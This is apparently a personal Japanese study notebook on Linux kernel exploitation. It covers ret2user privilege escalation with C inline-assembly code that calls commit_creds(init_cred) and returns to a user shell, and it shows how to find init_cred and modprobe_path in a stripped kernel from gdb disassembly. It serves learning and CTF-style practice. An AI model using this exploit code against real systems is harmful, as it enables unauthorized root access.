# studying kernel exploit
<primary-label ref="kernel" />

* preface
  * kernel exploitを勉強しています

## Basic information
[kernel基础知识-CSDN](https://blog.csdn.net/kidsama123/article/details/136663328)

## exploit technique
### ret2user
<secondary-label ref="lpe"/>
<secondary-label ref="no-smep"/>
<secondary-label ref="no-smap"/>
<secondary-label ref="no-kpti"/>
<secondary-label ref="no-shstk"/>

用意した関数をkernelから呼ぶことでkernel権限で関数を動かす.
`commit_cred(&init_cred)`などを呼び出しLPEを行う.
kernelからuserに戻る時に行うべき命令として`swapgs`と`iretq`がある.
`swapgs`はkernelとユーザー用のGSレジスタの内容を入れ替える.
`iretq`命令はスタックから順に値を取り出し,`RIP,CS,RFLAGS,RSP,SS`の各レジスタに設定してuserへ復帰する.
そのため,kernelから呼ぶ関数は以下のようなスタック構造を持った上で`iretq`を呼び,userに戻る.

```md
stack
+0x00 +---------------------+ <- rsp
      |         rip         |
+0x08 +---------------------+
      |        cs           | <- ユーザー用のコードセグメント
+0x10 +---------------------+
      |      rflags         | <- ユーザー用のCPUフラグ
+0x18 +---------------------+
      |        rsp          | <- ユーザー用のスタックポインタ
+0x20 +---------------------+
      |        ss           | <- ユーザー用のスタックセグメント
+0x28 +---------------------+
```
[](https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html)を参考にLPE,ret2userを作成した.
tips:[](#c-asm)
```c
static void refuge() {
    asm volatile (
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(cs), "=r"(ss), "=r"(rsp), "=r"(rflags)
        :
        : "memory");
}

static void ret2user(unsigned long rip) {
    asm volatile ("swapgs\n");
    asm volatile(
        "movq %0, 0x20(%%rsp)\t\n"
        "movq %1, 0x18(%%rsp)\t\n"
        "movq %2, 0x10(%%rsp)\t\n"
        "movq %3, 0x08(%%rsp)\t\n"
        "movq %4, 0x00(%%rsp)\t\n"
        "iretq"
        :
        : "r"(ss),
          "r"(rsp),
          "r"(rflags),
          "r"(cs), "r"(rip));
}

void lpe() {
    //char *(*pkc)(int) = (void *)prepare_kernel_cred;
    void (*cc)(char *) = (void *)commit_creds;
    //(*cc)((*pkc)(0));
    (*cc)((void *)init_cred);
    ret2user((unsigned long)shell);
}
```

### Kernel Return Oriented Programming
<secondary-label ref="lpe"/>
<secondary-label ref="no-shstk"/>
<secondary-label ref="no-ibt"/>


## tips
### kbase特定
```sh
cat /proc/kallsyms | head
```

### init_credのアドレス特定

linux kernel 6.2以降, prepare_kernel_credにNULLが渡せなくなった.よって
```c
commit_creds(prepare_kernel_cred(0))
```
でのLPEが出来ない. 解決策は単純で
```c
commit_creds(&init_creds)
```
をすればよいのだが,init_credのアドレスをstrippedなvmlinuxから直接特定出来ないのでどこからかのシンボルがexportされているところから辿るのが楽そうである.
`linux kernel 6.9.12`で検証した.

[init_cred-elixir-](https://elixir.bootlin.com/linux/v6.13.4/source/kernel/cred.c#L44)
elixirなどで以下のxRefをたどった

```C
int kernel_read_file_from_path_initns()
task_struct init_task()
cred init_cred()
```

[`kernel_read_file_from_path_initns`](https://elixir.bootlin.com/linux/v5.10.7/source/fs/kernel_read_file.c#L147)をidaで命令を確認したところ,最初のcall命令に渡されるrdiが`init_task.fs`.

![Screenshot_20250226_221608.png](Screenshot_20250226_221608.png)

```c
gef> x/50i 0xffffffff9c9f01c0
   0xffffffff9c9f01c0:  endbr64 
   0xffffffff9c9f01c4:  push   rbp
   0xffffffff9c9f01c5:  mov    rbp,rsp
   0xffffffff9c9f01c8:  push   r15
   0xffffffff9c9f01ca:  push   r14
   0xffffffff9c9f01cc:  push   r13
   0xffffffff9c9f01ce:  push   r12
   0xffffffff9c9f01d0:  push   rbx
   0xffffffff9c9f01d1:  sub    rsp,0x30
   0xffffffff9c9f01d5:  mov    QWORD PTR [rsp+0x8],rsi
   0xffffffff9c9f01da:  mov    QWORD PTR [rsp],rdx
   0xffffffff9c9f01de:  mov    DWORD PTR [rsp+0x14],r9d
   0xffffffff9c9f01e3:  mov    rax,QWORD PTR gs:0x28
   0xffffffff9c9f01ec:  mov    QWORD PTR [rsp+0x28],rax
   0xffffffff9c9f01f1:  xor    eax,eax
   0xffffffff9c9f01f3:  test   rdi,rdi
   0xffffffff9c9f01f6:  je     0xffffffff9c9f02d7
   0xffffffff9c9f01fc:  cmp    BYTE PTR [rdi],0x0
   0xffffffff9c9f01ff:  mov    r15,rdi
   0xffffffff9c9f0202:  je     0xffffffff9c9f02d7
   0xffffffff9c9f0208:  mov    rdi,0xffffffff9d60ac30 <- task_init.fs
   0xffffffff9c9f020f:  mov    r14,r8
   0xffffffff9c9f0212:  mov    r13,rcx
   0xffffffff9c9f0215:  call   0xffffffff9cf9f9e0
```

```c
0xffffffff9d60ab30:     0xffffffff9d638d40      0xffffffff9d638d40
                        [real_cred]             [cred]
0xffffffff9d60ab40:     0x2f72657070617773      0x0000000000000030
                        [comm]
0xffffffff9d60ab50:     0x0000000000000000      0x0000000000000000
0xffffffff9d60ab60:     0x0000000000000000      0x0000000000000000
0xffffffff9d60ab70:     0xffffffff9d6b3140      0xffffffff9d6b2c80
0xffffffff9d60ab80:     0x0000000000000000      0xffffffff9d638ba0
0xffffffff9d60ab90:     0xffffffff9d60c7e0      0xffffffff9d60bfc0
0xffffffff9d60aba0:     0x0000000000000000      0x0000000000000000
0xffffffff9d60abb0:     0x0000000000000000      0xffffffff9d60abb8
0xffffffff9d60abc0:     0xffffffff9d60abb8      0x0000000000000000
0xffffffff9d60abd0:     0x0000000000000000      0x0000000000000000
0xffffffff9d60abe0:     0x0000000000000000      0x0000000000000000
0xffffffff9d60abf0:     0x0000000000000000      0x0000000000000000
0xffffffff9d60ac00:     0x0000000000000000      0x0000000000000000
0xffffffff9d60ac10:     0x0000000000000000      0x0000000000000000
0xffffffff9d60ac20:     0x0000000000000000      0x0000000000000000
0xffffffff9d60ac30:     0x0000000000000000      0x0000000000000000
                        [task_init.fs]
```
`task_struct`はこのようになっており,ここからinit_credのオフセットが分かった.
[`task_struct`構造体によると](https://elixir.bootlin.com/linux/v5.10.7/source/include/linux/sched.h#L926)
fsの近くにcommという文字列と`init_cred`を保持する`real_cred`と`cred`が存在する.
commが特徴的なバイト列なのでかなりわかりやすいかも.
> 構造体における`ifdef`が有る場合のメモリマップが正直わからない :think:
```c
	const struct cred __rcu		*real_cred;
	const struct cred __rcu		*cred;

#ifdef CONFIG_KEYS
	struct key			*cached_requested_key;
#endif
	char				comm[TASK_COMM_LEN]; //0xffffffff81e12b80
```

### modprobe_pathの特定

この`modprobe_path`もexploitに使われるグローバルな変数で
[`modprobe_path`](https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/kmod.h#L20)
を用意したevalなスクリプトのパスに書き換えることでkernel権限で実行できる.
こいつもstrippedなvmlinuxから直接特定は無理なので`modprobe_path`の特定方法をメモ.

[`__request_module`](https://elixir.bootlin.com/linux/v6.13.4/source/kernel/module/kmod.c#L131)はシンボルがエクスポートされており,`modprobe_path`を参照しているので行けそうです.

![Screenshot_20250226_235055.png](Screenshot_20250226_235055.png)

`kallsyms`から`__request_module`のアドレスを得て,gdbでdisassします.
> idaでvmlinuxを読み込んで`.text`をrebaseしてから`__request_module`を見てもわかる.
> ida64に読み込ませるのめんどくさいしrebaseしないと`kaslr`考慮されてない
> 
> ![Screenshot_20250226_235304.png](Screenshot_20250226_235304.png)
> 

`modprobe_path`の使用箇所は以下のようなvalidationで,この通り`cmp BYTE PTR [], 0x0`の命令を見ると`modprobe_path`のアドレスが入っている.
```c
	if (!modprobe_path[0])
		return -ENOENT;
```

```py
gef> x/50i 0xffffffff9c8eb750
   0xffffffff9c8eb750:  endbr64 
   0xffffffff9c8eb754:  push   rbp
   0xffffffff9c8eb755:  mov    rbp,rsp
   0xffffffff9c8eb758:  push   r13
   0xffffffff9c8eb75a:  push   r12
   0xffffffff9c8eb75c:  mov    r12,rsi
   0xffffffff9c8eb75f:  push   r10
   0xffffffff9c8eb761:  lea    r10,[rbp+0x10]
   0xffffffff9c8eb765:  push   rbx
   0xffffffff9c8eb766:  mov    r13,r10
   0xffffffff9c8eb769:  mov    ebx,edi
   0xffffffff9c8eb76b:  sub    rsp,0x88
   0xffffffff9c8eb772:  mov    QWORD PTR [rbp-0x40],rdx
   0xffffffff9c8eb776:  mov    QWORD PTR [rbp-0x38],rcx
   0xffffffff9c8eb77a:  mov    QWORD PTR [rbp-0x30],r8
   0xffffffff9c8eb77e:  mov    QWORD PTR [rbp-0x28],r9
   0xffffffff9c8eb782:  mov    rax,QWORD PTR gs:0x28
   0xffffffff9c8eb78b:  mov    QWORD PTR [rbp-0x58],rax
   0xffffffff9c8eb78f:  xor    eax,eax
   0xffffffff9c8eb791:  test   dil,dil
   0xffffffff9c8eb794:  jne    0xffffffff9c8eb8e4
   0xffffffff9c8eb79a:  cmp    BYTE PTR [rip+0xdc0a9f],0x0        # 0xffffffff9d6ac240
                                        [modprobe_path]----------------------J
   0xffffffff9c8eb7a1:  je     0xffffffff9c8eb92e
```

### C言語におけるASM関数
`stdlib.h`に入っている`asm()`は以下のような記述をする
```c
asm volatile (
    "[instruction1]\n\t"      // Assembly
    "[instruction2]\n\t"      // Assembly
    : output operand          // 出力オペランドのリスト
    : input operand           // 入力オペランドのリスト
    : 破壊されるレジスタ   /* （オプション）破壊(clobber)リスト
);
```

* volatile
  * 最適化処理をしない.
* output operand
  * アセンブリ命令の実行結果を変数に返すために使う.
  * 書式は "constraint"(variable) となり,例えば`"=r"(dest)`は`任意のレジスタを使って値を出力し,その値を変数destに入れる`ことを意味する.
  * = は書き込み専用を示す.
  * assemblyと出力オペランドを%n (%0,%1,...)で参照する.
* input operand
  * アセンブリ命令内で使用する変数を指定する.
  * 書式は`"constraint"(variable)`で、例えば`"r"(src)`は`任意のレジスタに変数srcを配置する`ことを意味する.
* アセンブリ
  * アセンブリを記述する.
  * 入力オペランド,出力オペランドを参照するために使用する`%0`などは入力オペランド->出力オペランドで連続する.
  * gdbで見慣れているアセンブリとはオペランドが逆になっている.:think:







